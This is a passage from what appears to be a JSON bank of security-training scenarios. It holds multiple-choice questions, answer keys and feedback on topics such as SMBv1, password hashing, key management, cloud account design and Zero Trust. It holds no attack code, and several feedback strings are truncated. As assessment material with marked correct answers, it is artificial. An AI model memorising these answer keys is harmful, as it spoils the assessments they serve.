"D", "text": "Telnet is fine if you use strong passwords", "is_optimal": false, "feedback": "{'short': \"Strong passwords don't help if they're transmitted in cleartext\", 'detailed': 'Password strength is irrelevant if the password is sent across the network in cleartext. An attacker capturing traffic will see the password no matter how strong it is. Encryption (SSH) is the only solution.'}"}]}, {"id": "decision_4", "title": "Legacy Protocol Risks", "situation": "The vulnerability scan also flags SMBv1 enabled on several servers. The IT manager remembers something about ransomware using SMB vulnerabilities.", "question": "Why is SMBv1 particularly dangerous beyond cleartext concerns?", "options": [{"id": "A", "text": "SMBv1 is too slow for modern networks", "is_optimal": false, "feedback": "{'short': \"Performance isn't the security concern\", 'detailed': 'While SMBv1 is slower than newer versions, the critical concern is security vulnerabilities, not performance. SMBv1 has exploitable vulnerabilities that allow remote code execution.'}"}, {"id": "B", "text": "SMBv1 has wormable vulnerabilities (EternalBlue) enabling ransomware spread", "is_optimal": true, "feedback": "{'short': 'Correct! SMBv1 vulnerabilities enabled WannaCry and other attacks', 'detailed': \"SMBv1 has critical vulnerabilities including EternalBlue (MS17-010) that allow remote code execution without authentication. WannaCry and NotPetya ransomware used this to spread across networks automatically. SMBv1 should be disabled - there's no safe way to use it.\"}"}, {"id": "C", "text": "SMBv1 only works on Windows systems", "is_optimal": false, "feedback": "{'short': \"Platform support isn't the security issue\", 'detailed': \"SMBv1 works across platforms (Windows, Linux Samba). The security issue is the protocol's vulnerabilities that allow attackers to execute code remotely, not its platform support.\"}"}, {"id": "D", "text": "SMBv1 uses too much bandwidth", "is_optimal": false, "feedback": "{'short': \"Bandwidth isn't the security concern\", 'detailed': 'The critical issue with SMBv1 is exploitable vulnerabilities, not bandwidth usage. These vulnerabilities allow attackers to spread malware across networks without any user interaction.'}"}]}, {"id": "decision_5", "title": "Defense in Depth Principle", "situation": "The clinic administrator asks why they need multiple security controls. 'Can't we just buy one really good firewall?' The IT manager asks you to explain defense in depth.", "question": "What is the core principle of defense in depth?", "options": [{"id": "A", "text": "Buy the most expensive security product available", "is_optimal": false, "feedback": "{'short': \"Cost doesn't equal protection\", 'detailed': \"Defense in depth isn't about spending more on a single solution - it's about having multiple layers. An expensive firewall can still be bypassed through phishing. Multiple controls at different layers provide true protection.\"}"}, {"id": "B", "text": "Multiple security layers so if one fails, others still protect", "is_optimal": true, "feedback": "{'short': 'Correct! No single point of failure', 'detailed': 'Defense in depth assumes any single control can fail (bypassed, misconfigured, zero-day). Multiple layers mean: perimeter firewall might block the attack, but if not, internal segmentation limits spread, and if not, endpoint protection might detect it, and if not, data encryption protects the information. No single point of failure.'}"}, {"id": "C", "text": "Configure security controls to maximum restrictiveness", "is_optimal": false, "feedback": "{'short': \"Restrictiveness helps but isn't the core principle\", 'detailed': 'Being restrictive is good practice, but defense in depth is specifically about multiple layers. A maximally restrictive single control is still a single point of failure. The depth (multiple layers) is the key concept.'}"}, {"id": "D", "text": "Focus all security budget on perimeter defense", "is_optimal": false, "feedback": "{'short': 'Perimeter-only is the opposite of defense in depth', 'detailed': \"Perimeter-focused security is 'castle and moat' thinking - strong outer wall, nothing inside. Defense in depth distributes controls across perimeter, network, endpoint, application, and data layers. Modern attacks often bypass perimeters (phishing, insider threat).\"}"}]}], "passing_score": 70, "max_score": 100}, {"id": "D3-REM-003", "domain": 3, "type": "REM", "title": "Cryptography Essentials Remediation", "difficulty": "foundational", "role": "Security Analyst", "organization": {"name": "Riverside Credit Union"}, "introduction": "Riverside Credit Union is conducting security training for IT staff. As a new security analyst trainee, you're participating in the cryptography fundamentals module. Understanding encryption and data protection is essential for protecting member financial information.", "decision_points": [{"id": "decision_1", "title": "Encryption Type Selection", "situation": "Riverside needs to encrypt a large database of member account information at rest. The data is several terabytes and performance is a concern.", "question": "What type of encryption is best for encrypting a large database at rest?", "options": [{"id": "A", "text": "Asymmetric encryption (RSA) for maximum security", "is_optimal": false, "feedback": "{'short': 'Asymmetric encryption is too slow for bulk data', 'detailed': 'Asymmetric encryption (RSA, ECC) is hundreds of times slower than symmetric encryption. Using asymmetric for terabytes of data would be impractical - operations would be extremely slow. Asymmetric is used for key exchange, not bulk data encryption.'}"}, {"id": "B", "text": "Symmetric encryption (AES) for performance with large data", "is_optimal": true, "feedback": "{'short': 'Correct! AES is designed for bulk data encryption', 'detailed': \"Symmetric encryption (AES-256 is the current standard) is designed for bulk data encryption. It's fast and efficient even for large datasets. The key is protected using key management practices (possibly including asymmetric encryption for key exchange/protection).\"}"}, {"id": "C", "text": "Hashing (SHA-256) to protect the data", "is_optimal": false, "feedback": "{'short': \"Hashing doesn't protect data confidentiality\", 'detailed': \"Hashing is one-way - you can't recover the original data from a hash. Hashing a database would destroy the data! Hashing is for integrity verification and password storage, not data protection. Encryption (two-way) is needed for confidentiality.\"}"}, {"id": "D", "text": "Combination of both asymmetric and symmetric for every record", "is_optimal": false, "feedback": "{'short': 'Hybrid is used, but not per-record', 'detailed': \"Hybrid encryption (asymmetric for key exchange, symmetric for data) is common, but asymmetric isn't applied to every record. Asymmetric protects the symmetric key; symmetric encrypts the data. The combination provides security and performance.\"}"}]}, {"id": "decision_2", "title": "Password Storage", "situation": "Riverside is reviewing how member passwords are stored in their online banking system. Currently, passwords are encrypted using AES and stored in the database.", "question": "Is encrypting passwords with AES the correct approach?", "options": [{"id": "A", "text": "Yes - AES provides strong protection for passwords", "is_optimal": false, "feedback": "{'short': \"Encryption allows recovery - passwords shouldn't be recoverable\", 'detailed': 'If passwords are encrypted, they can be decrypted. This means: the encryption key becomes a high-value target, and anyone with the key can access all passwords. Passwords should never be recoverable - even by administrators.'}"}, {"id": "B", "text": "No - passwords should be hashed, not encrypted", "is_optimal": true, "feedback": "{'short': 'Correct! Hashing is one-way - passwords cannot be recovered', 'detailed': 'Passwords should be hashed (with salt) using algorithms like bcrypt, Argon2, or PBKDF2. Hashing is one-way - the original password cannot be recovered. To verify login, hash the entered password and compare hashes. Even if the database is stolen, attackers get hashes, not passwords.'}"}, {"id": "C", "text": "No - passwords should be stored in plaintext for easier reset", "is_optimal": false, "feedback": "{'short': 'Never store passwords in plaintext!', 'detailed': 'Plaintext passwords are the worst option - any breach exposes all credentials immediately. Password resets should generate new passwords, not retrieve old ones. Always hash passwords.'}"}, {"id": "D", "text": "Either hashing or encryption is equally acceptable", "is_optimal": false, "feedback": "{'short': 'They serve different purposes - hashing is correct for passwords', 'detailed': 'Encryption and hashing are not interchangeable. Encryption is for data you need to retrieve. Hashing is for data you only need to verify (like passwords). The principle of password storage is: never store recoverable passwords.'}"}]}, {"id": "decision_3", "title": "Data States Protection", "situation": "A security consultant asks about Riverside's data protection strategy. They want to know if data is protected at rest and in transit.", "question": "Why must data be protected BOTH at rest AND in transit?", "options": [{"id": "A", "text": "Regulatory compliance requires both", "is_optimal": false, "feedback": "{'short': 'Compliance is one reason, but not the fundamental reason', 'detailed': 'While regulations often require both, the underlying reason is that data faces different threats in different states. Understanding the threats is more important than just compliance.'}"}, {"id": "B", "text": "Each state faces different threats - storage theft vs. interception", "is_optimal": true, "feedback": "{'short': 'Correct! Different states, different threats', 'detailed': 'Data at rest faces threats like storage theft, unauthorized database access, and backup exposure. Data in transit faces interception, man-in-the-middle attacks, and eavesdropping. Encrypting only one leaves the other exposed. Complete protection requires addressing both.'}"}, {"id": "C", "text": "Encrypting one automatically protects the other", "is_optimal": false, "feedback": "{'short': 'Incorrect - they require separate controls', 'detailed': \"Encrypting data at rest (disk encryption) doesn't protect data when it's transmitted over a network. Encrypting in transit (TLS) doesn't protect stored data. Each requires separate controls designed for that specific threat.\"}"}, {"id": "D", "text": "It's only necessary for highly sensitive data", "is_optimal": false, "feedback": "{'short': 'Good practice applies broadly', 'detailed': 'While prioritization by sensitivity makes sense, protecting data in both states is a fundamental security practice. The ease of implementing TLS and disk encryption means most data should be protected in both states.'}"}]}, {"id": "decision_4", "title": "Key Management", "situation": "The credit union encrypts backup tapes before sending them to offsite storage. The encryption key is stored in a file on the backup server.", "question": "What is the BIGGEST problem with this key management approach?", "options": [{"id": "A", "text": "The key file might get corrupted", "is_optimal": false, "feedback": "{'short': 'Corruption is a concern but not the biggest problem', 'detailed': 'Key backup and protection against corruption is important, but the bigger issue is security. A corrupted key means lost data, but a compromised key means breached data.'}"}, {"id": "B", "text": "Key stored with/near encrypted data - compromise exposes both", "is_optimal": true, "feedback": "{'short': 'Correct! Key and data should be separated', 'detailed': 'Storing the encryption key on the backup server means anyone who compromises that server gets both the encrypted backups AND the key to decrypt them. Keys should be stored separately - in a key management system, HSM, or at minimum, a separate secured system. Never store keys with the data they protect.'}"}, {"id": "C", "text": "The key should be stored in the cloud instead", "is_optimal": false, "feedback": "{'short': 'Location matters less than separation', 'detailed': 'Cloud key management (Azure Key Vault, AWS KMS) can be excellent, but the key point is separation from the encrypted data, not cloud vs. on-premises. A cloud key for on-premises backups achieves separation.'}"}, {"id": "D", "text": "Multiple people need access to the key", "is_optimal": false, "feedback": "{'short': \"Access control matters but isn't the primary issue here\", 'detailed': 'Key access should be limited, but the fundamental problem is storing the key with the protected data. Even with restricted access, anyone who compromises the backup server gets everything.'}"}]}, {"id": "decision_5", "title": "Certificate Understanding", "situation": "Riverside's website certificate is expiring. The IT team asks why certificates expire and what happens if they don't renew it.", "question": "What is the PRIMARY purpose of digital certificates in HTTPS?", "options": [{"id": "A", "text": "To encrypt all web traffic", "is_optimal": false, "feedback": "{'short': \"Encryption uses the key, but certificate's role is different\", 'detailed': \"The certificate contains a public key used in the encryption process, but the certificate's primary purpose is to PROVE the server's identity. Without identity verification, you might establish an encrypted connection to an attacker.\"}"}, {"id": "B", "text": "To verify the server's identity - prove you're connecting to the real site", "is_optimal": true, "feedback": "{'short': 'Correct! Certificates provide identity verification', 'detailed': \"Certificates bind a public key to an identity (the website's domain). A trusted Certificate Authority verifies the domain owner. When you connect to https://riverside-cu.com, the certificate proves you're actually connecting to Riverside Credit Union, not an attacker. Then encryption protects the session.\"}"}, {"id": "C", "text": "To make the website load faster", "is_optimal": false, "feedback": "{'short': 'Certificates are for security, not performance', 'detailed': 'HTTPS (with certificates) actually adds a small overhead compared to HTTP. The purpose is security - identity verification and encryption - not performance. Modern protocols (HTTP/2, QUIC) can improve HTTPS performance.'}"}, {"id": "D", "text": "To comply with PCI-DSS requirements", "is_optimal": false, "feedback": "{'short': 'Compliance is a result, not the purpose', 'detailed': \"PCI-DSS requires HTTPS for payment pages (due to the security it provides), but compliance isn't the certificate's purpose. The purpose is security through identity verification and enabling encrypted communications.\"}"}]}], "passing_score": 70, "max_score": 100}, {"id": "D3-SIM-001", "domain": 3, "type": "SIM", "title": "Cloud Security Architecture", "difficulty": "intermediate", "role": "Security Analyst", "organization": {"name": "Meridian Financial Services"}, "introduction": "Meridian Financial Services is executing an ambitious cloud migration strategy. As the newly hired Cloud Security Architect, you're responsible for designing the security architecture that will protect critical financial data across a multi-cloud environment. The CISO has emphasized that security cannot be an afterthought - it must be built into the architecture from day one. Your first week involves critical decisions that will shape the security posture for years to come.", "decision_points": [{"id": "decision_1", "title": "Service Model Selection for Customer Portal", "situation": "Your first task is migrating the customer-facing portal to AWS. The portal is a .NET application currently running on Windows servers. The development team wants to modernize but also needs to move quickly. You need to recommend the appropriate cloud service model.", "question": "Which cloud service model should you recommend for the customer portal migration?", "options": [{"id": "A", "text": "IaaS (EC2 instances) - lift and shift the existing application", "is_optimal": false, "feedback": "{'short': \"Works but doesn't leverage cloud benefits\", 'detailed': \"Lift-and-shift to EC2 is possible and low-risk, but you inherit all OS patching, scaling, and management overhead. For a customer-facing portal requiring 99.9% availability, you'd need to build auto-scaling, load balancing, and high availability yourself. This approach moves to cloud without benefiting from cloud-native features.\", 'consequence': 'Migration completes but operational burden remains high. Team spends time on infra"}, {"id": "B", "text": "PaaS (Elastic Beanstalk or App Service) - platform handles infrastructure", "is_optimal": true, "feedback": "{'short': 'Correct! PaaS reduces operational burden while maintaining control', 'detailed': 'PaaS is ideal for web applications like the customer portal. AWS Elastic Beanstalk handles capacity provisioning, load balancing, auto-scaling, and health monitoring. You maintain control over the application code while AWS manages the platform. This reduces your security responsibility (no OS patching) while meeting the 99.9% availability requirement more easily.', 'consequence': 'Successful migration w"}, {"id": "C", "text": "SaaS - find a third-party customer portal solution", "is_optimal": false, "feedback": "{'short': \"SaaS isn't appropriate for custom applications\", 'detailed': \"The customer portal is a custom .NET application with proprietary business logic and integrations. SaaS solutions are pre-built applications - you can't deploy your custom code to a SaaS platform. SaaS is for adopting existing applications, not hosting your own.\", 'consequence': \"This approach isn't technically feasible for the custom application.\"}"}, {"id": "D", "text": "Serverless (Lambda) - maximum cloud-native benefits", "is_optimal": false, "feedback": "{'short': 'Serverless requires significant refactoring for existing applications', 'detailed': \"While serverless offers compelling benefits (no server management, pay-per-use), migrating an existing .NET application to Lambda requires significant refactoring into functions. This conflicts with the need to 'move quickly.' Serverless is better for new development or applications designed for event-driven architecture.\", 'consequence': 'Extended timeline and development effort for refactoring. Risk"}]}, {"id": "decision_2", "title": "AWS Account Strategy", "situation": "The existing single AWS account is inadequate for production workloads. You need to design an account strategy that provides security isolation, supports compliance requirements, and scales with the organization.", "question": "What AWS account strategy should you implement?", "options": [{"id": "A", "text": "Keep single account but improve IAM policies and tagging", "is_optimal": false, "feedback": "{'short': \"Single account doesn't provide adequate isolation\", 'detailed': \"A single account creates significant risks: no blast radius containment (one compromised workload affects all), complex IAM (everyone's policies in one place), compliance difficulties (PCI scope includes everything), and cost allocation challenges. For regulated financial services, this approach is inadequate.\", 'consequence': 'Auditors flag account structure as a control weakness. IAM complexity leads to privilege creep"}, {"id": "B", "text": "Environment-based accounts (Dev, Test, Staging, Production)", "is_optimal": false, "feedback": "{'short': \"Better but doesn't provide workload isolation\", 'detailed': 'Environment separation is an improvement - production is isolated from dev/test. However, all production workloads share one account, meaning a vulnerability in one application could affect others. For financial services with multiple sensitive applications, workload-level isolation is preferable.', 'consequence': 'Improved but PCI assessor questions why all production workloads share an account.'}"}, {"id": "C", "text": "Multi-account with workload isolation (Organizations, SCPs, dedicated security account)", "is_optimal": true, "feedback": "{'short': 'Correct! Maximum isolation and control for regulated workloads', 'detailed': 'Multi-account strategy with AWS Organizations provides: blast radius isolation (issues contained to one account), granular IAM (simpler policies per account), compliance boundaries (PCI workloads in dedicated accounts), cost allocation, and centralized governance via SCPs. The dedicated security account enables centralized logging, GuardDuty, and Security Hub management.', 'consequence': 'Strong foundation f"}, {"id": "D", "text": "Separate AWS accounts per team without central governance", "is_optimal": false, "feedback": "{'short': 'Decentralized accounts create governance gaps', 'detailed': 'Account sprawl without Organizations creates chaos: no consistent security controls, no centralized logging, inconsistent compliance posture, billing complexity. Each team could have different (or no) security configurations. Central governance through Organizations and SCPs is essential.', 'consequence': 'Shadow IT in the cloud. Security team has no visibility across accounts.'}"}]}, {"id": "decision_3", "title": "Identity and Access Architecture", "situation": "The organization has 2,500 employees using on-premises Active Directory. Cloud resources need identity management that integrates with existing systems, supports MFA, and provides SSO across AWS and SaaS applications.", "question": "What identity architecture should you implement?", "options": [{"id": "A", "text": "Create IAM users in each AWS account for cloud access", "is_optimal": false, "feedback": "{'short': \"IAM users don't scale and create management overhead\", 'detailed': 'Creating IAM users means: managing credentials in multiple places (AD + AWS), no SSO (users need separate AWS credentials), complex offboarding (must remove from AD AND each AWS account), and no leverage of existing AD groups. This approach is only suitable for service accounts or break-glass access.', 'consequence': 'Identity sprawl, inconsistent access revocation, users sharing credentials due to friction.'}"}, {"id": "B", "text": "AWS IAM Identity Center (SSO) with native directory", "is_optimal": false, "feedback": "{'short': 'Creates duplicate identity management', 'detailed': \"Using IAM Identity Center with its own directory means managing two separate identity stores (AD + Identity Center). Users must be provisioned in both systems. This creates sync issues, doesn't leverage existing AD investment, and doubles identity management workload.\", 'consequence': 'Two identity systems to manage. Access inconsistencies between on-prem and cloud.'}"}, {"id": "C", "text": "Federate with Azure AD (synced from on-prem AD) using SAML", "is_optimal": true, "feedback": "{'short': 'Correct! Single identity source with cloud-native capabilities', 'detailed': 'Azure AD synced with on-prem AD provides: single identity source (manage in AD, sync to cloud), SSO across AWS and SaaS (Azure AD as identity hub), built-in MFA and Conditional Access, mature enterprise features, and clean integration path for Microsoft 365 and other SaaS. AWS IAM Identity Center can federate from Azure AD for AWS access.', 'consequence': 'Unified identity management. Users get SSO experienc"}, {"id": "D", "text": "Direct AD FS federation to each AWS account", "is_optimal": false, "feedback": "{'short': 'Works but adds complexity and on-prem dependency', 'detailed': \"AD FS federation directly to AWS works but: requires maintaining AD FS infrastructure (high availability, patching), creates tight dependency on on-premises systems, and doesn't provide the rich SaaS integration that Azure AD offers. For a multi-cloud strategy including SaaS, Azure AD is more flexible.\", 'consequence': 'Functional but increased infrastructure management and limited SaaS integration.'}"}]}, {"id": "decision_4", "title": "Network Connectivity Architecture", "situation": "Production workloads require secure, reliable connectivity between on-premises data centers and AWS. The core banking system will remain on-premises, requiring low-latency communication with cloud workloads.", "question": "What network connectivity architecture should you implement?", "options": [{"id": "A", "text": "Site-to-site VPN as the primary connection", "is_optimal": false, "feedback": "{'short': 'VPN has bandwidth and latency limitations for production', 'detailed': \"Site-to-site VPN traverses the internet, resulting in variable latency and limited bandwidth (~1.25 Gbps per tunnel). For financial services requiring low-latency communication with core banking systems, VPN doesn't provide the performance consistency needed. VPN is appropriate for backup connectivity or dev/test.\", 'consequence': 'Performance issues during high-traffic periods. Occasional latency spikes affect us"}, {"id": "B", "text": "AWS Direct Connect as primary, VPN as backup", "is_optimal": true, "feedback": "{'short': 'Correct! Dedicated connection with redundant backup', 'detailed': \"Direct Connect provides dedicated, private connectivity with consistent low latency and high bandwidth (up to 100 Gbps). Combined with VPN as backup, you get: production-grade performance for core banking integration, private connectivity (doesn't traverse internet), and automatic failover if Direct Connect fails. This hybrid approach balances performance, cost, and reliability.\", 'consequence': 'Consistent, high-perfo"}, {"id": "C", "text": "All traffic over public internet with TLS encryption", "is_optimal": false, "feedback": "{'short': \"Internet connectivity doesn't meet financial services requirements\", 'detailed': 'Public internet connectivity, even encrypted, is unsuitable for sensitive financial data: highly variable latency, potential compliance concerns with data traversing public networks, bandwidth limitations, and no SLA. This approach is inappropriate for production financial workloads.', 'consequence': 'Performance unpredictability. Potential compliance violations. No SLA for connectivity.'}"}, {"id": "D", "text": "Dual Direct Connect connections without VPN backup", "is_optimal": false, "feedback": "{'short': 'Dual Direct Connect is ideal but expensive without flexibility', 'detailed': 'Dual Direct Connect provides maximum performance and redundancy, but: higher cost (two dedicated connections), longer provisioning time for the second connection, and no diversity if both connections terminate in the same facility. VPN backup provides different-path redundancy at lower cost.', 'consequence': 'Higher cost without significantly better resilience than Direct Connect + VPN.'}"}]}, {"id": "decision_5", "title": "Data Encryption Strategy", "situation": "The customer portal handles sensitive financial data including PII and transaction information. PCI-DSS and GLBA require encryption. You need to define the encryption strategy for data at rest in AWS.", "question": "What encryption approach should you implement for sensitive data at rest?", "options": [{"id": "A", "text": "AWS managed keys (SSE-S3) for simplicity", "is_optimal": false, "feedback": "{'short': 'AWS managed keys lack audit trail and control', 'detailed': \"SSE-S3 encrypts data but: you can't audit key usage (no CloudTrail entries for key access), can't enforce separation of duties (anyone with S3 access can decrypt), and can't implement key rotation policies. For regulated financial data, you need more control and auditability than AWS managed keys provide.\", 'consequence': 'Encryption exists but auditors question lack of key access logging and control.'}"}, {"id": "B", "text": "Customer-managed KMS keys with key policies and rotation", "is_optimal": true, "feedback": "{'short': 'Correct! Full control, audit trail, and compliance alignment', 'detailed': 'Customer-managed KMS keys provide: CloudTrail logging of all key usage (who decrypted what, when), key policies for access control (separation of duties), automatic key rotation, and the ability to disable/delete keys if compromised. This meets PCI-DSS requirements for key management documentation and auditing.', 'consequence': 'Full encryption audit trail. Clear key access controls. Compliance requirements sa"}, {"id": "C", "text": "Client-side encryption before uploading to AWS", "is_optimal": false, "feedback": "{'short': 'Client-side is more complex without significant benefit here', 'detailed': \"Client-side encryption provides maximum control (AWS never sees unencrypted data) but: increases application complexity, makes server-side processing impossible (can't query encrypted data), and requires managing key distribution to clients. For most use cases, KMS encryption provides sufficient control with less complexity.\", 'consequence': 'Increased development complexity. Difficult to implement analytics o"}, {"id": "D", "text": "No encryption at rest - TLS in transit is sufficient", "is_optimal": false, "feedback": "{'short': 'PCI-DSS requires encryption at rest for cardholder data', 'detailed': \"PCI-DSS Requirement 3.4 mandates rendering cardholder data unreadable wherever it's stored. 'TLS in transit only' is a compliance violation. Additionally, data at rest encryption protects against various threats including insider access and backup theft.\", 'consequence': 'PCI-DSS compliance failure. Potential security breach exposure.'}"}]}], "passing_score": 70, "max_score": 100}, {"id": "D3-SIM-002", "domain": 3, "type": "SIM", "title": "Zero Trust Implementation", "difficulty": "intermediate", "role": "Security Analyst", "organization": {"name": "NexGen Pharmaceuticals"}, "introduction": "NexGen Pharmaceuticals' board has mandated Zero Trust architecture after a competitor suffered a $200M breach when attackers compromised a contractor's VPN credentials. Your CISO assigns you to lead the transformation: 'We have 24 months and significant budget. Our research IP is our competitive advantage - we're developing treatments worth billions. Design a Zero Trust architecture that protects our crown jewels without crippling research productivity.'", "decision_points": [{"id": "decision_1", "title": "Zero Trust Starting Point", "situation": "The CISO asks for your recommendation on where to start the Zero Trust transformation. The IT Director suggests starting with network micro-segmentation: 'That's what Zero Trust is about - segmenting the network.' The Identity team argues for identity-first: 'Users are the biggest risk, start there.' You need to make a recommendation.", "question": "Where should NexGen begin its Zero Trust implementation?", "options": [{"id": "A", "text": "Start with network micro-segmentation - isolate the crown jewels immediately", "is_optimal": false, "feedback": "{'short': 'Segmentation without identity creates policy complexity', 'detailed': \"Micro-segmentation requires knowing WHO is accessing resources to create effective policies. Without strong identity, you're segmenting based on IP addresses and network zones - the old model. Identity provides the foundation for policy decisions: 'researcher X can access research data' not 'subnet Y can access server Z'. Start with identity to enable meaningful segmentation.\", 'consequence': 'Segmentation policies"}, {"id": "B", "text": "Start with identity - strong authentication and conditional access as foundation", "is_optimal": true, "feedback": "{'short': 'Correct! Identity is the foundation of Zero Trust', 'detailed': 'Identity is the control plane for Zero Trust. Start by: (1) Establishing strong identity (Azure AD, MFA for all users), (2) Building conditional access policies, (3) Achieving device compliance visibility. This creates the foundation for all other Zero Trust capabilities. Network controls, application access, and data protection all depend on knowing who the user is and whether to trust them.', 'consequence': 'Strong ide"}, {"id": "C", "text": "Start everywhere at once - comprehensive transformation is faster", "is_optimal": false, "feedback": "{'short': 'Boiling the ocean overwhelms the organization', 'detailed': 'Zero Trust transformation touches every aspect of IT - network, identity, devices, applications, data. Attempting everything simultaneously overwhelms the organization, spreads resources thin, and increases failure risk. Phased approach with identity first creates the foundation that other capabilities build upon.', 'consequence': 'Scope overwhelm. Multiple parallel initiatives conflict. Limited progress everywhere.'}"}, {"id": "D", "text": "Start with data protection - protecting the crown jewels is the ultimate goal", "is_optimal": false, "feedback": "{'short': 'Data protection needs identity to be effective', 'detailed': \"Data protection (classification, DLP, rights management) requires knowing who should access what data - that requires identity. DLP policies like 'prevent researchers from sending IP externally' need to know who is a researcher. Start with identity, then layer data protection on top of that foundation.\", 'consequence': \"Data protection rules can't reference user context effectively. Generic rules miss nuance.\"}"}]}, {"id": "decision_2", "title": "Authentication Strategy", "situation": "The identity team presents authentication options. Currently, users have username/password plus RSA tokens for VPN. The team proposes upgrading to Microsoft Authenticator push notifications for all MFA. A security researcher on your team argues for phishing-resistant methods: 'Push notifications can be MFA-fatigued. We need FIDO2 everywhere.'", "question": "What authentication strategy should you recommend?", "options": [{"id": "A", "text": "Microsoft Authenticator for everyone - good balance of security and usability", "is_optimal": false, "feedback": "{'short': 'Push notifications are vulnerable to MFA fatigue attacks', 'detailed': \"Push notification MFA is better than SMS or no MFA, but it's vulnerable to 'MFA fatigue' attacks where attackers spam authentication requests until the user accepts one. For a pharmaceutical company protecting billions in research IP, this risk is significant. Phishing-resistant MFA should be required for sensitive access.\", 'consequence': '3 months later, attacker uses MFA fatigue to access researcher account aft"}, {"id": "B", "text": "Tiered approach - phishing-resistant (FIDO2) for privileged/research access, push for general", "is_optimal": true, "feedback": "{'short': 'Correct! Risk-based authentication with phishing-resistant for sensitive access', 'detailed': 'Tiered authentication balances security and usability: FIDO2 security keys or Windows Hello for business (phishing-resistant) required for research systems, privileged access, and sensitive data. Push notification MFA acceptable for general corporate applications. This protects crown jewels with strongest authentication while maintaining usability for lower-risk access.', 'consequence': 'Hig"}, {"id": "C", "text": "FIDO2 for everyone - maximum security across the board", "is_optimal": false, "feedback": "{'short': 'FIDO2 everywhere creates adoption challenges', 'detailed': 'FIDO2 security keys are the most secure but require hardware distribution and user training. Mandating them for all 4,200 users (including those who only access email) creates adoption friction and increases help desk burden. Risk-based tiering applies strongest controls where they matter most.', 'consequence': 'Hardware key deployment challenges. User resistance. Delayed rollout.'}"}, {"id": "D", "text": "Keep RSA tokens - proven technology, why change?", "is_optimal": false, "feedback": "{'short': \"RSA tokens are outdated and don't support modern Zero Trust\", 'detailed': \"RSA SecurID tokens (TOTP) don't integrate well with modern conditional access policies, don't support passwordless, and are vulnerable to real-time phishing. Modern Zero Trust requires adaptive MFA that can evaluate risk signals and adjust requirements. Legacy tokens should be migrated to modern methods.\", 'consequence': \"Legacy authentication limits Zero Trust capabilities. Can't implement conditional access p"}]}, {"id": "decision_3", "title": "Micro-Segmentation Approach", "situation": "The network team is designing micro-segmentation. They propose starting with the research network: create strict segments around IP databases and research systems. A concern is raised: 'We don't actually know all the traffic flows in the research network. If we segment wrong, we'll break things.' The team asks for guidance.", "question": "How should you approach micro-segmentation implementation?", "options": [{"id": "A", "text": "Deploy strict segmentation immediately - better to be secure and fix issues as they arise", "is_optimal": false, "feedback": "{'short': 'Breaking production systems creates resistance and rollback', 'detailed': 'Enforcing segmentation without understanding traffic flows will break legitimate communications. Research systems have complex dependencies that may not be documented. Breaking production research creates backlash against the security program and likely rollback. Discovery before enforcement is essential.', 'consequence': 'Critical research workflows broken. Emergency exceptions created. Segmentation project lo"}, {"id": "B", "text": "Map traffic flows in learning mode first, then create policies based on actual behavior", "is_optimal": true, "feedback": "{'short': 'Correct! Discover, design, then enforce', 'detailed': 'Proper micro-segmentation workflow: (1) Deploy in learning/visibility mode - observe actual traffic flows, (2) Map dependencies - understand what talks to what and why, (3) Design policies based on observed legitimate flows + business requirements, (4) Simulate enforcement - show what would be blocked, (5) Remediate issues before enforcement, (6) Enforce in stages with rollback capability.', 'consequence': 'Policies based on actua"}, {"id": "C", "text": "Skip segmentation - VPN removal and identity-based access is enough", "is_optimal": false, "feedback": "{'short': 'Network segmentation is a critical Zero Trust layer', 'detailed': 'Identity and network controls are complementary, not alternatives. If credentials are compromised, network segmentation limits what the attacker can access. Defense in depth requires both. Micro-segmentation contains breaches and prevents lateral movement even if identity controls fail.', 'consequence': 'Single layer of defense. Compromised credentials provide broad network access.'}"}, {"id": "D", "text": "Let the network team decide - this is a network operations issue", "is_optimal": false, "feedback": "{'short': 'Security architect must guide security strategy', 'detailed': 'As Security Architect, you own the Zero Trust strategy. The network team implements, but the approach (discovery first, policy design, staged enforcement) is a security decision. Abdicating this guidance results in either broken systems (enforce too fast) or ineffective segmentation (too permissive).', 'consequence': 'No clear strategy. Implementation varies. Inconsistent security posture.'}"}]}, {"id": "decision_4", "title": "Device Trust Implementation", "situation": "The BYOD policy allows researchers to use personal devices. The compliance team is nervous: 'How can we trust unmanaged devices with research data?' The research director pushes back: 'Our scientists need flexibility. Don't restrict their devices.' You need to define device trust levels.", "question": "How should you handle device trust for unmanaged/BYOD devices?", "options": [{"id": "A", "text": "Ban all unmanaged devices - security requires control", "is_optimal": false, "feedback": "{'short': 'Complete ban creates shadow IT and productivity issues', 'detailed': 'Banning personal devices entirely drives users to work around controls (shadow IT). Researchers may email data to personal devices or use unauthorized cloud storage. Better to provide controlled access that meets user needs within security boundaries. Zero Trust is about appropriate access, not denial of all access.', 'consequence': 'Researchers find workarounds. Data ends up in uncontrolled locations. Security visi"}, {"id": "B", "text": "Allow unmanaged devices with reduced access - web-only, no sensitive data, enhanced monitoring", "is_optimal": true, "feedback": "{'short': 'Correct! Tiered access based on device trust level', 'detailed': 'Device trust tiers enable appropriate access: Unmanaged devices can access web-based applications only (email via browser, collaboration tools) with no data download capability. Managed devices required for research systems and sensitive data. This balances flexibility with protection - users have choice, but access is commensurate with trust level.', 'consequence': 'Users have flexibility for general work. Sensitive ac"}, {"id": "C", "text": "Trust all devices equally - focus security on data protection instead", "is_optimal": false, "feedback": "{'short': 'Device posture is a critical Zero Trust factor', 'detailed': \"Data protection alone isn't sufficient - malware on a compromised device can steal data, capture credentials, or manipulate applications regardless of data-level controls. Device health verification is a core Zero Trust principle: is the device secure? Is it compromised? Device trust enables risk-appropriate access decisions.\", 'consequence': 'Compromised personal device accesses research systems. Malware steals credentials"}, {"id": "D", "text": "Require MDM enrollment for all BYOD - partial management as minimum", "is_optimal": false, "feedback": "{'short': 'Forced MDM creates adoption friction', 'detailed': \"Requiring MDM enrollment on personal devices creates privacy concerns and adoption resistance. Some users won't enroll their personal devices. A tiered approach (full access = full management, limited access = no management) gives users the choice rather than forcing management on unwilling users.\", 'consequence': 'Users resist MDM on personal devices. Either reduced productivity or workarounds emerge.'}"}]}, {"id": "decision_5", "title": "Remote Access Architecture", "situation": "The VPN replacement discussion is underway. Current state: Cisco AnyConnect provides full network tunnel to corporate network. The network team proposes replacing VPN with identity-aware proxy for web applications but keeping VPN for legacy client-server applications. A consultant suggests going fully VPN-less with Software-Defined Perimeter (SDP).", "question": "What remote access architecture should you implement?", "options": [{"id": "A", "text": "Keep VPN for everything - it's proven and users know it", "is_optimal": false, "feedback": "{'short': 'VPN provides network access, not Zero Trust application access', 'detailed': \"Traditional VPN provides broad network access once connected - 